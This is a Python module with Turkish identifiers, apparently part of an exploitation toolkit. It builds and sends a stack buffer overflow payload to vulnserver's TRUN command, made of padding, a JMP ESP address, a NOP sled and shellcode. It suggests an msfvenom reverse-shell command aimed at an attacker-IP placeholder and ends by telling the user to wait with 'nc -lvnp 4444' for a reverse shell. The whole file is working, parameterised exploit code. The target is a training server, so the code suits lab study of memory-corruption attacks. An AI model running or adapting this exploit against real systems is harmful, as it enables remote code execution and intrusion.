#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious istismarcı modülü - final buffer overflow exploit
"""

from typing import Optional

from cekirdek.gunluk import Gunluk
from cekirdek.baglanti import BaglantiYoneticisi, BaglantiHatasi
from cekirdek.yardimcilar import (
    adres_pakitle,
    hex_goster,
    msfvenom_onerisi,
    payload_dosyadan_oku,
)


def istismar_baslat(
    hedef_ip: str,
    hedef_port: int,
    offset: int = 2003,
    jmp_adresi: str = "625011af",
    shellcode: Optional[bytes] = None,
    shellcode_dosyasi: Optional[str] = None,
    nop_boyutu: int = 32,
    komut: str = "TRUN",
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> bool:
    """
    final buffer overflow exploit'ini çalıştırır

    payload yapısı:
        [KOMUT /.:/] + [A * offset] + [JMP ESP adresi] + [NOP sled] + [shellcode]

    parametreler:
        hedef_ip: hedef sunucu ip adresi
        hedef_port: hedef sunucu port numarası
        offset: eip offset değeri
        jmp_adresi: jmp esp gadget adresi (hex string)
        shellcode: shellcode byte verisi
        shellcode_dosyasi: shellcode dosya yolu (shellcode parametresine alternatif)
        nop_boyutu: nop sled uzunluğu
        komut: vulnserver komutu
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        exploit gönderimi başarılı ise true
    """
    log = gunluk or Gunluk()

    log.baslik("exploit çalıştırılıyor")
    log.bilgi(f"hedef          : {hedef_ip}:{hedef_port}")
    log.bilgi(f"komut          : {komut}")
    log.bilgi(f"eip offset     : {offset}")
    log.bilgi(f"jmp esp adresi : 0x{jmp_adresi}")
    log.bilgi(f"nop sled       : {nop_boyutu} byte")
    log.bos_satir()

    # shellcode yükle
    if shellcode is None and shellcode_dosyasi:
        try:
            shellcode = payload_dosyadan_oku(shellcode_dosyasi)
            log.basari(f"shellcode dosyadan yüklendi: {shellcode_dosyasi}")
            log.bilgi(f"shellcode boyutu: {len(shellcode)} byte")
        except FileNotFoundError:
            log.hata(f"shellcode dosyası bulunamadı: {shellcode_dosyasi}")
            return False
        except ValueError as hata:
            log.hata(f"shellcode dosyası okunamadı: {hata}")
            return False

    if shellcode is None:
        log.uyari("shellcode belirtilmedi, test payload'ı kullanılacak")
        log.bilgi("gerçek shellcode için msfvenom kullanın:")
        log.bos_satir()
        oneri = msfvenom_onerisi(
            yerel_ip="<SALDIRGAN_IP>",
            yerel_port=4444,
            kotu_karakterler="\\x00",
        )
        log.bilgi(f"  {oneri}")
        log.bos_satir()

        # test shellcode: int3 breakpoint (debugger'da yakalanır)
        shellcode = b"\xCC" * 4
        log.uyari("test modu: INT3 (0xCC) breakpoint shellcode kullanılıyor")

    log.bos_satir()

    # jmp esp adresini little-endian formatına çevir
    try:
        donusum_adresi = adres_pakitle(jmp_adresi)
        log.bilgi(f"jmp esp (packed): {donusum_adresi.hex()}")
    except ValueError as hata:
        log.hata(f"geçersiz jmp esp adresi: {hata}")
        return False

    # payload oluştur
    komut_bayt = f"{komut} /.:/".encode("latin-1")
    dolgu = b"A" * offset
    nop_sled = b"\x90" * nop_boyutu

    payload = komut_bayt + dolgu + donusum_adresi + nop_sled + shellcode

    log.bos_satir()
    log.bilgi("payload yapısı:")
    log.bilgi(f"  komut kısmı    : {len(komut_bayt)} byte")
    log.bilgi(f"  dolgu (A)      : {len(dolgu)} byte")
    log.bilgi(f"  jmp esp        : {len(donusum_adresi)} byte")
    log.bilgi(f"  nop sled       : {len(nop_sled)} byte")
    log.bilgi(f"  shellcode      : {len(shellcode)} byte")
    log.ayirici("-", 40)
    log.bilgi(f"  toplam payload : {len(payload)} byte")
    log.bos_satir()

    # shellcode hex dump (ilk 64 byte)
    log.bilgi("shellcode (ilk 64 byte):")
    log.bos_satir()
    gosterilecek = shellcode[:64]
    print(hex_goster(gosterilecek))
    if len(shellcode) > 64:
        print(f"  ... ve {len(shellcode) - 64} byte daha")
    log.bos_satir()

    # hedef erişilebilirlik kontrolü
    baglanti = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
    if not baglanti.hedef_eriselebilir_mi():
        log.hata(f"hedef erişilemiyor: {hedef_ip}:{hedef_port}")
        return False

    # exploit gönder
    log.bilgi("exploit payload'ı gönderiliyor...")

    try:
        gonderici = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
        gonderici.baglan_ve_gonder(payload, deneme_sayisi=1)
        log.bos_satir()
        log.basari("exploit başarıyla gönderildi!")
        log.bos_satir()
        log.bilgi("reverse shell bekliyorsanız:")
        log.bilgi("  nc -lvnp 4444")
        return True
    except BaglantiHatasi as hata:
        log.hata(f"exploit gönderimi başarısız: {hata}")
        return False
